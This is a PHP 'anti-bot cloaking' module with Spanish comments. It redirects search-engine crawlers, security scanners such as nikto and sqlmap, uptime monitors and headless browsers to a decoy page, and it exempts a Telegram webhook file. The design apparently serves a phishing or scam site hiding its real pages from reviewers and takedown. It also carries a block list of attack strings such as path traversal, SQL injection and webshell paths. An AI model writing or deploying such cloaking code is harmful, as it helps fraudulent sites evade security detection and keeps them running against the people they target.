<?php
/**
 * cloak.php — Módulo de Cloaking Anti-Bot
 * Incluir al inicio de cualquier página pública.
 * Si detecta un bot, redirige a decoy.php y termina la ejecución.
 */

// Skip cloaking check for Telegram Webhook endpoint and static asset files
$reqPath = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH);
if (strpos($reqPath, 'updatetele.php') !== false) {
    return;
}
$reqExt = strtolower(pathinfo($reqPath, PATHINFO_EXTENSION));
if (in_array($reqExt, ['js', 'css', 'png', 'jpg', 'jpeg', 'svg', 'gif', 'ttf', 'woff', 'woff2', 'ico'])) {
    return;
}

// ══════════════════════════════════════════════
// 1. CONFIGURACIÓN
// ══════════════════════════════════════════════
$DECOY_URL = '/decoy.php'; // Dónde redirigir a bots
$RATE_LIMIT_MAX = 60; // Max peticiones por ventana
$RATE_LIMIT_WIN = 60; // Ventana en segundos
$TMP_DIR = sys_get_temp_dir(); // Directorio para rate-limit

// IPs/rangos whitelisted (nunca bloquear). Agrega las tuyas si es necesario.
$WHITELIST_IPS = [
    '127.0.0.1',
    '::1',
];

// ══════════════════════════════════════════════
// 2. BLACKLIST DE USER-AGENTS DE BOTS
// ══════════════════════════════════════════════
$BOT_UA_PATTERNS = [
    // Scrapers & crawlers genéricos
    'bot', 'crawler', 'spider', 'scraper', 'slurp',
    // Herramientas CLI
    'curl', 'wget', 'libwww', 'lwp-trivial', 'urllib',
    // Lenguajes / libs comunes en scripts
    'python-requests', 'python-urllib', 'python-httpx',
    'go-http-client', 'java/', 'okhttp', 'apache-httpclient',
    'ruby', 'perl', 'php/', 'axios', 'node-fetch', 'got/',
    // Bots de SEO / pentesters
    'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot',
    'rogerbot', 'blexbot', 'seznambot', 'sitelock',
    'nikto', 'nessus', 'sqlmap', 'metasploit', 'masscan',
    'nmap', 'dirbuster', 'gobuster', 'whatweb',
    // Monitores / verificadores
    'pingdom', 'uptimerobot', 'statuscake', 'site24x7',
    'monitis', 'freshping', 'hetrix',
    // Headless browsers sin spoofing
    'phantomjs', 'headlesschrome', 'slimerjs',
    // Otros conocidos
    'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduckbot',
    'ia_archiver', 'facebookexternalhit', 'twitterbot',
];

// ══════════════════════════════════════════════
// 3. STRINGS SOSPECHOSOS EN HEADERS / URL
// ══════════════════════════════════════════════
$SUSPICIOUS_URL_PATTERNS = [
    '../', '..\\', // Path traversal
    'etc/passwd', 'etc/shadow', // LFI clásico
    'wp-admin', 'wp-login', 'wordpress', // Scan WP
    'phpmyadmin', 'pma/', 'adminer', // Scan DB tools
    '.git/', '.env', 'composer.json', // Info disclosure
    'eval(', 'base64_decode', '<?php', // Code injection
    'select%20', 'union%20', 'or%201=1', // SQLi
    '<script', 'javascript:', // XSS
    '/shell', '/cmd', '/exec', // Webshells
];

// ══════════════════════════════════════════════
// 4. FUNCIONES AUXILIARES
// ══════════════════════════════════════════════

function cloak_get_ip(): string
{
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($keys as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP))
                return $ip;
        }
    }
    return '0.0.0.0';
}

function cloak_send_to_decoy(string $reason, string $decoyUrl): void
{
    // No revelar la verdadera razón; simplemente redirigir
    http_response_code(503);
    header('Retry-After: 3600');
    header('Location: ' . $decoyUrl);
    exit;
}

function cloak_rate_limit(string $ip, int $max, int $window, string $tmpDir): bool
{
    $file = $tmpDir . '/rl_' . md5($ip) . '.json';
    $now = time();
    $data = [];

    if (file_exists($file)) {
        $raw = @file_get_contents($file);
        $data = $raw ? json_decode($raw, true) : [];
    }

    // Limpiar entradas fuera de la ventana
    $data = array_filter($data, fn($t) => $t > ($now - $window));
    $data[] = $now;

    @file_put_contents($file, json_encode(array_values($data)), LOCK_EX);

    return count($data) > $max;
}

// ══════════════════════════════════════════════
// 5. EJECUCIÓN DE CHEQUEOS
// ══════════════════════════════════════════════

$clientIP = cloak_get_ip();
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$requestURI = strtolower($_SERVER['REQUEST_URI'] ?? '');
$queryStr = strtolower($_SERVER['QUERY_STRING'] ?? '');

// ── 5a. Whitelist de IPs propias ─────────────────
if (in_array($clientIP, $WHITELIST_IPS, true)) {
    return; // Pasar sin controles
}

// ── 5b. User-Agent vacío o claramente anormal ───
if (strlen($userAgent) < 10) {
    cloak_send_to_decoy('empty_ua', $DECOY_URL);
}

// ── 5c. Blacklist de User-Agents ────────────────
foreach ($BOT_UA_PATTERNS as $pattern) {
    if (strpos($userAgent, $pattern) !== false) {
        cloak_send_to_decoy('bot_ua:' . $pattern, $DECOY_URL);
    }
}

// ── 5d. Header Accept-Language ausente ──────────
// Los browsers reales siempre envían Accept-Language; los bots básicos no.
$acceptLang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
if (empty($acceptLang)) {
    cloak_send_to_decoy('no_accept_language', $DECOY_URL);
}

// ── 5e. URLs / Query strings sospechosas ────────
$fullRequest = $requestURI . '?' . $queryStr;
foreach ($SUSPICIOUS_URL_PATTERNS as $pat) {
    if (strpos($fullRequest, strtolower($pat)) !== false) {
        http_response_code(403);
        exit('403 Forbidden');
    }
}

// ── 5f. Rate limiting por IP ─────────────────────
if (cloak_rate_limit($clientIP, $RATE_LIMIT_MAX, $RATE_LIMIT_WIN, $TMP_DIR)) {
    cloak_send_to_decoy('rate_limit', $DECOY_URL);
}

// ── 5g. Honeypot POST: campo oculto relleno ──────
// Si el formulario envía el campo honeypot, es un bot.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $honeypotValue = $_POST['_website_url'] ?? null;
    if ($honeypotValue !== null && $honeypotValue !== '') {
        cloak_send_to_decoy('honeypot_filled', $DECOY_URL);
    }
}

// ── Todo OK: el cliente parece humano ────────────
// No hacer nada, dejar continuar la ejecución normal.
